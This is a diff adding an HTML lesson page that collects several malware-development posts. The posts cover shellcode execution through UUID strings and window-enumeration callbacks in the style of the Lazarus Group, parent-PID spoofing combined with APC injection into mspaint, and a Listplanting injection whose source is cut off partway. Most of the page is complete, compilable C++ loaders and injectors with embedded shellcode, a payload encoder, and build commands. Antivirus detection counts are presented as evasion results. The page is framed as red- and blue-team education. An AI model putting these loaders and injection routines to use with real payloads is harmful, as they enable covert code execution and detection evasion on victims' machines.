@@ -1,0 +1,1591 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development tricks. run shellcode like a Lazarus</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #14</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development tricks. run shellcode like a Lazarus</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Group. C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This article is the result of my own research into another interesting trick: run payload via UuidFromStringA and for example EnumChildWindows. UuidFromStringA This function converts a string to UUID: RPC_STATUS UuidFromStringA( RPC_CSTR StringUuid, UUID *Uuid ); Without using standard functions like memcpy or <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code>, this function can be used to decode data as well as write it to memory. The shellcode execution technique is comprised of the subsequent steps:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Allocate memory via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Use UuidFromStringA to convert UUID strings their binary format and store</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">in memory</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Use EnumChildWindows (or EnumDesktopsA or another candidate) to execute</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">the payload previously loaded into memory</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. The trick is pretty simple, similar to previous tricks, but with some changes specific for Lazarus Group. First of all, we need script to convert our desired payload to UUID valid strings. Something like this (payload_uuid.py): #!usr/bin/python3</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">from uuid import UUID
+import argparse
+parser = argparse.ArgumentParser()
+parser.add_argument('-p','--payload', required = True, help = "payload: binary file")
+args = vars(parser.parse_args())
+pbin = args['payload']
+with open(pbin, "rb") as f:
+# read in 16 bytes from our input payload
+chunk = f.read(16)
+while chunk:
+# if the chunk is less than 16 bytes then we pad the difference (x90)
+if len(chunk) &lt; 16:
+padding = 16 - len(chunk)
+chunk = chunk + (b"\x90" * padding)
+print(UUID(bytes_le=chunk))
+chunk = f.read(16)
+As usually, I will use my meow-meow messagebox payload: meow.bin.
+Run:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 payload_uuid.py -p meow.bin</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Since we already have our payload in UUID format, we are able to construct our proofof-concept code to test the following:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;rpc.h&gt;
+#include &lt;iostream&gt;
+#pragma comment(lib, "Rpcrt4.lib")
+const char* uuids[] = {
+"e48148fc-fff0-ffff-e8d0-000000415141",
+"56515250-3148-65d2-488b-52603e488b52",
+"8b483e18-2052-483e-8b72-503e480fb74a",
+"c9314d4a-3148-acc0-3c61-7c022c2041c1",
+"01410dc9-e2c1-52ed-4151-3e488b52203e",
+"483c428b-d001-8b3e-8088-0000004885c0",
+"01486f74-50d0-8b3e-4818-3e448b402049",
+"5ce3d001-ff48-3ec9-418b-34884801d64d",
+"3148c931-acc0-c141-c90d-4101c138e075",
+"034c3ef1-244c-4508-39d1-75d6583e448b",
+"01492440-66d0-413e-8b0c-483e448b401c",
+"3ed00149-8b41-8804-4801-d0415841585e",
+"58415a59-5941-5a41-4883-ec204152ffe0",
+"5a594158-483e-128b-e949-ffffff5d49c7",
+"000000c1-3e00-8d48-95fe-0000003e4c8d",
+"00010985-4800-c931-41ba-45835607ffd5",
+"41c93148-f0ba-a2b5-56ff-d54d656f772d",
+"776f656d-0021-5e3d-2e2e-5e3d00909090"
+};
+int main() {
+int elems = sizeof(uuids) / sizeof(uuids[0]);
+VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000,
+PAGE_EXECUTE_READWRITE);
+DWORD_PTR hptr = (DWORD_PTR)mem;
+for (int i = 0; i &lt; elems; i++) {
+// printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
+// printf("%s\n", *(uuids+i));
+RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
+RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
+if (status != RPC_S_OK) {
+printf("[-] UUID convert error\n");
+CloseHandle(mem);
+return -1;
+}
+hptr += 16;
+
+}
+EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+// EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
+CloseHandle(mem);
+return 0;
+}
+Pay attention to the function UuidFromStringA. As I wrote earlier, invoking this API
+with a memory pointer instead of a UUID pointer will result in the binary representation
+of the given UUID being stored in memory.
+By chaining many API requests and giving properly designed UUIDs, it is possible to
+load the necessary content (payload) into the chosen memory region.
+And then, as a pointer to the callback function in EnumChildWindows we specify this
+memory region:
+EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+or another function EnumDesktopsA:
+EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ \ -L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive -lrpcrt4</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run in our victim’s machine: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To make sure that our payload was really launched, you can slightly change a piece of code: printf("[*] Hexdump: ");</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">for (int i = 0; i &lt; elems*16; i++) {
+printf("%02X ", ((unsigned char*)mem)[i]);
+}
+Then compile again:
+x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
+-I/usr/share/mingw-w64/include/ \
+-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ -static-libgcc \
+-fpermissive -lrpcrt4
+
+and run again:
+.\hack.exe
+
+As you can see, everything is work perfectly :)</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload hack.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 6 of 68 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/003e45e65361b09fd8e372d29fbdecfb3462d920 2ddf31bf386c728c9cebafa0/detection There is a caveat. Lazarus Group uses functions HeapCreate and HeapAlloc instead:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+void* mem = HeapAlloc(hc, 0, 0x100000);
+HeapAlloc is a frequently used API call for allocating heap memory.
+This API, as far as I can tell, allows you to allocate specified amounts of memory on
+the heap, as opposed to the memory blocks obtained using the VirtualAlloc API.
+However, according to the documentation, HeapAlloc can still call VirtualAlloc if
+necessary.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">It also has the advantage that this API is not so suspicious. Also Lazarus Group uses function EnumSystemLocalesA for execute payload. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. nccgroup - RIFT: Analysing a Lazarus Shellcode Execution Method Lazarus Group</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">source code in github</p>
+
+            <div id="36-malware-development-tricks-parent-pid-spoofing-simple-c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>36. malware development tricks: parent PID spoofing. Simple C++</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">example</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This article is the result of my own investigation into interesting trick: parent process ID spoofing. parent PID spoofing Monitoring the relationships between parent and child processes is a common method used by threat hunting teams to identify malicious activities. Red teams have adopted parent PID spoofing as a method of evasion. The CreateProcess Windows API call supports a parameter that allows the user to specify the Parent PID. This means that a malicious process can use a different parent than the one being executed when it is created.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s look at a practical example. First of all, let’s say that we have some process, like mspaint.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, PID is 3396. If we look at its parent process (PID: 2876), we can see explorer.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also we can see via Process Hacker that current directory is C:\Windows\System32\:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, the execution flow of this trick is detailed in the following steps: I got explorer.exe PID: int pid = findMyProc(argv[1]);</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">if (pid) {
+printf("PID = %d\n", pid);
+}
+HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);
+Create process mspaint.exe:
+CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
+CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), &amp;pi);
+LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000,
+MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Write meow-meow payload to created process memory:
+BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload, sizeof(my_payload), nb);
+Add a user-mode asynchronous procedure call (APC) object to the APC queue of the
+thread of the created process:
+QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);
+Resume thread:
+
+ResumeThread(pi.hThread);
+CloseHandle(pi.hThread);</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, the full source code of this trick is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+parent PID spoofing with APC
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;iostream&gt;
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+
+int main(int argc, char* argv[]) {
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+STARTUPINFOEXA si;
+PROCESS_INFORMATION pi;
+SIZE_T st;
+int pid = findMyProc(argv[1]);
+if (pid) {
+printf("PID = %d\n", pid);
+}
+HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);
+ZeroMemory(&amp;si, sizeof(STARTUPINFOEXA));
+InitializeProcThreadAttributeList(NULL, 1, 0, &amp;st);
+si.lpAttributeList =
+(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, st);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;st);
+UpdateProcThreadAttribute(si.lpAttributeList, 0,
+PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;ph, sizeof(HANDLE), NULL, NULL);
+
+si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
+CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL,
+NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), &amp;pi);
+LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE |
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+SIZE_T *nb = 0;
+BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload,
+sizeof(my_payload), nb);
+QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);
+ResumeThread(pi.hThread);
+CloseHandle(pi.hThread);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, I reused my code from this and this posts. Here I have hardcoded a bit the process which being started, you can modify it so that it accepts it from the command-line arguments</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -mwindows -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then run it on the victim’s machine: .\hack.exe explorer.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Run Process Hacker and as you can see, mspaint.exe process successfully created (PID: 4720):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">as you can see, parent process is 2876 which is corresponds to explorer.exe, but current directory is Z:\2022-09-06-malware-tricks-23! And what is in the process memory?</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So everything is work perfectly :) Actually I deceived you a little. in my example goes not just parent process spoofing. It’s a combination of PPID spoofing and APC injection. Because I am also learning new things like you and sometimes you need to ask yourself questions and don’t be afraid to experiment. Let’s go to upload hack.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 20 of 70 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/3ec9f1080253f07695f0958ae84e99ff065f052c 409f0f7e3e1a79cd4385a9d5/detection This technique is used in Cobalt Strike and KONNI RAT. For example Cobalt Strike can spawn processes with alternate PPIDs.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Originally this technique was introduced into the wider information security audience in 2009 by Didier Stevens I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Didier Stevens: That Is Not My Child Process! MITRE ATT&CK: Parent PID spoofing Cobalt Strike KONNI CreateProcessA Find process ID by name and inject to it APC injection technique source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">37. malware development tricks. Listplanting. C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Hello, cybersecurity enthusiasts and white hackers!</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into the malware dev trick: Listplanting. Using the LVM_SORTGROUPS, LVM_INSERTGROUPSORTED, and LVM_SORTITEMS messages, a ListView control’s items and groups can have their sorting behavior modified to suit individual preferences. List-view controls are user interface windows that display groups of things. A SysListView32 control stores information about an application’s list-view settings in the process’ memory. ListPlanting may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. The trick is pretty simple: First of all, get windows handle: HWND wpw = FindWindow(NULL, (LPCSTR)"Registry Editor"); HWND hw = FindWindowEx(wpw, 0, (LPCSTR)"SysListView32", 0); Then, get process ID, and open it (get process handle by <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code>): GetWindowThreadProcessId(hw, &pid); ph = <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code>(PROCESS_ALL_ACCESS, FALSE, pid); At the next step, we allocate <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">RWX</code>-memory via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> and “copy” payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">mem = <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code>(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_RE</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// copy payload
+WriteProcessMemory(ph, mem, my_payload, sizeof(my_payload), NULL);
+Finally, trigger payload:
+// trigger payload
+PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem);
+According to documentation, PostMessage - Places (posts) a message in the message
+queue associated with the thread that created the specified window and returns without
+waiting for the thread to process the message.
+The full source code of my PoC:
+/*
+hack.cpp
+code injection Listplanting
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/11/27/malware-tricks-24.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;commctrl.h&gt;
+#include &lt;iostream&gt;
+#pragma comment (lib, "user32.lib")
